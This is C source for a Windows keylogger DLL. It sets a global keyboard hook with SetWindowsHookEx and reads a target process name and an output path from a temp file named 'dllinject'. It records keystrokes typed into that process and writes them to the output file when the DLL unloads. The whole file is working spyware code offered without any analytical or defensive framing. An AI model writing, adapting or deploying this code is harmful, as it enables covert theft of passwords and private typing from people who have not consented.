//keyboard hook
//keyboardhook.dll

//using SetWindowsHookEx()

#include <stdio.h>
#include <Windows.h>

#define BUFFER_SIZE 1000

HHOOK hHook;
HINSTANCE hDll;
char processName[MAX_PATH];
char datadestination[MAX_PATH];
char keyBuffer[MAX_PATH];
HANDLE file = INVALID_HANDLE_VALUE;
BYTE keyboardState[256];

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam) {
	if (code == 0) {
		if (!(lParam & 0x80000000)) {
			if (lstrlenA(keyBuffer) >= BUFFER_SIZE - 1) {
				return CallNextHookEx(hHook, code, wParam, lParam);
			}
			char modulePath[MAX_PATH] = { 0 };
			GetModuleFileNameA(NULL, modulePath, MAX_PATH);
			if (!_stricmp(strrchr(modulePath, '\\') + 1, processName)) {
				WORD keyvalue;
				unsigned int scanCode = (lParam >> 16) & 0x00ff;
				GetKeyboardState(keyboardState);
				if (ToAscii(wParam, scanCode, keyboardState, &keyvalue, 0) == 1)
					keyBuffer[lstrlenA(keyBuffer)] = keyvalue;
			}
		}
	}
	return CallNextHookEx(hHook, code, wParam, lParam);
}

#ifdef __cplusplus
extern "C" {
#endif
	__declspec(dllexport) int HookStart() {
		hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, hDll, 0);
		if (hHook == NULL) {
			printf("setwindowshookex error");
			return -1;
		}
		else return 0;
	}

	__declspec(dllexport) int HookStop() {
		if (hHook) {
			if (UnhookWindowsHookEx(hHook)) {
				return 0;
			}
			else {
				return -1;
			}
		}
		return -1;
	}
#ifdef __cplusplus
}
#endif

BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpvReserved) {
	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:
		hDll = hinstDll;
		if (file == INVALID_HANDLE_VALUE) {
			char parameterPath[MAX_PATH];
			char parameters[2 * MAX_PATH + 1];
			DWORD bytesIsRead;
			if (GetTempPathA(MAX_PATH - 10, parameterPath) == 0) break;
			lstrcatA(parameterPath, "dllinject");
			file = CreateFileA(parameterPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			if (file == INVALID_HANDLE_VALUE) break;
			ReadFile(file, parameters, MAX_PATH, &bytesIsRead, NULL);
			int i;
			for (i = 0; parameters[i] != '|'; i++) {
				processName[i] = parameters[i];
			}
			i++;
			lstrcpyA(datadestination, &parameters[i]);
			CloseHandle(file);
			file = INVALID_HANDLE_VALUE;
		}
		break;
	case DLL_PROCESS_DETACH:
		if (lstrlenA(keyBuffer) != 0) {
			if (file == INVALID_HANDLE_VALUE) {
				file = CreateFileA(datadestination, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
				if (file == INVALID_HANDLE_VALUE) break;
			}
			else
				break;
			DWORD bytesWritten;
			WriteFile(file, keyBuffer, sizeof(keyBuffer), &bytesWritten, NULL);
			CloseHandle(file);
			file = INVALID_HANDLE_VALUE;
		}
		break;
	default:
		break;
	}
	return true;
}